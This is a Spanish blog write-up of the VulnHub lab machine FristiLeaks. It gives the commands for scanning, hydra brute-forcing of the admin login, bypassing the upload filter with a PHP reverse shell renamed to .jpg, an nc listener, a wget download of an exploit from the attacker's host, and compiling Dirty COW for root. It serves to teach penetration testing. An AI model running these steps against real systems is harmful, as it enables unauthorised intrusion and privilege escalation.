---
layout: post
title: Resolviendo FristiLeaks (WriteUp)
categories: WriteUp
---

A continuación voy a relatar el proceso que llevé a cabo para resolver la máquina virtual [FristiLeaks](https://www.vulnhub.com/entry/fristileaks-13,133/). 

### WriteUp

En primer lugar hay que identificar la dirección IP de la máquina virtual objetivo. Esto se puede realizar haciendo uso de arp-scan. En nuestro caso, la dirección IP de FristiLeaks, máquina objetivo, será **192.168.1.70.**

El primer paso dentro de la enumeración será el de ver puertos abiertos y servicios activos en ellos. Para ello hacemos uso de nmap con la instrucción “nmap -Pn -p- 192.168.1.70” para **escanear todos los puertos**. El resultado es el siguiente:

Not shown: 65534 filtered ports
PORT   STATE SERVICE
**80/tcp open  http**

Siendo este un entorno controlado y sin limitaciones ni nada que nos frenes, podríamos haber explotado al máximo la velocidad de nmap haciendo uso de la siguiente instrucción que también escaneará todos los puertos, a más velocidad y nos almacenará el resultado en un fichero llamado allPorts:

“nmap -p- -sS --min-rate 5000 --open -Pn -v -n 192.168.1.70 -oG allPorts”

El resultado que observamos es que solo hay un puerto abierto, que es el 80, por donde corre un servicio web. Para obtener más información sobre el servicio ejecutamos la siguiente instrucción:

 “nmap 192.168.1.70 -Pn -A --script vuln -p80”

Esto nos devuelve que está corriendo la siguiente versión de Apache:

“Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)”

Sobre el sistema operativo nos indica lo siguiente:

```
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
```

Y el script http-enum de nmap no indica la siguiente información interesante:
```
| http-enum:
|   /robots.txt: Robots file
|   /icons/: Potentially interesting folder w/ directory listing
|_  /images/: Potentially interesting folder w/ directory listing
```

Mientras esto se ejecutaba, por otro lado, se le echa un vistazo rápido a la página web comprobando si dispone de sitemap o robots y **encontramos un robots.txt con la siguiente información:**

```
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

Paso a buscar vulnerabilidades y exploits disponibles para la versión 2.2.15 de Apache. Primero a través de la herramienta **searchsploit**, y encuentro lo siguiente:
Apache 2.2.15 mod_proxy - Reverse Proxy Security Bypass

También revisamos la información de vulnerabilidades que tiene registrado **cvedetails.com**, qué son las siguientes: [https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-93077/Apache-Http-Server-2.2.15.html](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-93077/Apache-Http-Server-2.2.15.html)

Teniendo también vulnerabilidades concretas y explotables desde Metasploit:
[https://www.cvedetails.com/metasploit-modules/version-93077/Apache-Http-Server-2.2.15.html](https://www.cvedetails.com/metasploit-modules/version-93077/Apache-Http-Server-2.2.15.html).

Los siguientes pasos que llevamos a cabo, sin mucho éxito, son el escaneo del contenido de la página web haciendo uso de DirBuster y un diccionario de directorios, un escaneo de puertos UDP y la revisión de la carpeta “images” detectada anteriormente, la cual solo contiene fotos de Obi-Wan.

El siguiente paso es hacer un reconocimiento de directorios y contenidos de la página web pero más concreto y específico. Para ello hago uso de **CeWL** con la idea de generar un diccionario de palabras que aparezcan en la página web para usarla con DirBuster. Para ello, hago uso del siguiente comando:

**cewl --write fristileaks_words.txt --meta 192.168.1.70**

Y a dicho diccionario generado **le agrego manualmente las palabras encontradas en las imágenes de la página web**, que son las siguientes: keep, calm, drink, fristi, url, looking.

Ahora sí, haciendo uso de DirBuster **se encuentra una carpeta llamada fristi.** En esta ruta hay un panel de administración con un login. 

Pruebo con algunas **inyecciones SQL básicas y contraseñas típicas pero no funciona.** Además, el **mensaje de error devuelto es genérico** (fallo en la contraseña o el usuario) por lo que no podemos usar el panel para averiguar nombres de usuario. 

Paso a **analizar el código de la web.** Para comenzar me llama la atención la imagen, puesto que esta **imagen no está listada en la carpeta** /images/. En el código indica, como comentario, que **se utiliza base64 encoding para cargar la imagen.** 

Después del código de la imagen hay un **código similar comentado, lo introduzco en un decodificador base64 online y me indica que es una imagen PNG** pero no me la muestra. Con las propias **herramientas del navegador** modifico el código de la web cambiando el código base64 de la imagen original por la nueva, y **me devuelve la siguiente imagen**:

![FristiLeaks 01]({{ site.baseurl }}/images/fristileaks01.png)

Vemos que nos devuelve la frase **keKkeKKeKKeKkEkkEk.**
La pruebo con admin, fristi y algunas cosas más pero no hay éxito.

Con **CeWL** genero un **nuevo diccionario** de la web del panel de administración. 
**Combino el diccionario que tenía anteriormente con el nuevo, además le agrego al diccionario la palabra de la imagen** y limpio un poco el segundo diccionario que, a causa de la forma de cargar las imágenes usando encode base64, estaba lleno de strings sin sentido. 

Mi idea es utilizar **hydra para realizar fuerza bruta usando este diccionario como nombre de usuario y como contraseña.** Para ello, haciendo uso de las herramientas del navegador, compruebo que el usuario y la contraseña se comprueban con un POST hacia http://192.168.1.70/fristi/checklogin.php y anoto las tres variables que se les pasa (myusername, mypassword y Submit).

Con esta información construyo el siguiente comando de hydra:

```
hydra 192.168.1.70 http-form-post "/fristi/checklogin.php:myusername=^USER^&mypassword=^PASS^&Submit=Login:Wrong Username or Password" -L  /home/vant/Escritorio/Pruebas/fristileaks_words.txt -P /home/vant/Escritorio/Pruebas/fristileaks_words.txt
```
Dando el siguiente resultado:

![FristiLeaks 02]({{ site.baseurl }}/images/fristileaks02.png)

Podemos ver que se realizan 10201 intentos de iniciar sesión y **se encuentra un acceso válido con el nombre de usuario eezeepz y la contraseña keKkeKKeKKeKkEkkEk.**

Entro en el panel de administración y me muestra la **opción de subir ficheros.** Lo primero que intento es subir una reverse shell en PHP directamente, pero el servidor no me deja, me dice lo siguiente:
“Sorry, is not a valid file. Only allowed are: png,jpg,gif
Sorry, file not uploaded”

Pruebo a **renombrar el fichero poniéndole en el final .jpg. El servidor se lo traga y el fichero es subido, mostrándome lo siguiente:**
“Uploading, please wait
The file has been uploaded to /uploads”.

En la reverse shell definí mi IP y el puerto al que tendrá que conectarse. Por lo que antes de ejecutarla abro un netcat en mi ordenador con el siguiente comando **“nc -nlvp 1234”** siendo 1234 dicho puerto definido en la reverse shell. Lo dejo en escucha y **abro en el navegador el siguiente enlace:** http://192.168.1.70/fristi/uploads/php-reverse-shell.php.jpg 

Se establece la conexión y ya estaríamos dentro de la máquina objetivo:

![FristiLeaks 03]({{ site.baseurl }}/images/fristileaks03.png)

Con “whoami” podemos comprobar que **estamos dentro con el usuario “apache”, por lo que necesitamos una escalada de privilegios.** Para realizar la escalada de privilegios hay muchas cosas que se pueden analizar, existen herramientas como [LinEnum](https://github.com/rebootuser/LinEnum) que ayudan a realizar este análisis. En esta ocasión no es necesaria tanta profundidad. Simplemente **comprobamos con “uname -a” la versión del kernel, la cual es la 2.6.32-573.8.1.el6.x86_64.**

Buscamos en Google exploits de escalada de privilegios para esta versión de kernel, y encuentro el siguiente exploit en ExploitDB: [https://www.exploit-db.com/exploits/10018](https://www.exploit-db.com/exploits/10018).

Una vez descargado en local tenemos que subir dicho exploit a la máquina objetivo. Para eso, me monto un servidor en mi equipo haciendo uso de **SimpleHTTPServer** con la siguiente instrucción: python -m SimpleHTTPServer 8000

**En la máquina objetivo nos descargamos el fichero** en la carpeta /tmp haciendo uso de curl o wget, por ejemplo de la siguiente forma: “wget 192.168.1.45:8000/10018.sh”. Siendo la dirección IP la de la máquina atacante donde tenemos activo el servidor de SimpleHTTPServer. 

Este exploit no consigue su objetivo, no funciona. **Después de probar varios exploits sin éxito llego a un exploit que ataca la vulnerabilidad Dirty COW, el exploit es el siguiente: [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c).
Lo subo a la carpeta /tmp tal como expliqué antes y lo compilo siguiendo las instrucciones que se indican en el propio exploit, es decir, con **“gcc -pthread dirty.c -o dirty -lcrypt”**

Una vez compilado lo ejecuto, le introduzco una contraseña y, después de algunos minutos, termina su ejecución. 

**Esto te genera un usuario llamado firefart con la contraseña introducida con permisos de root:**

![FristiLeaks 04]({{ site.baseurl }}/images/fristileaks04.png)

De esta forma ya podríamos acceder a la flag:

![FristiLeaks 05]({{ site.baseurl }}/images/fristileaks05.png)
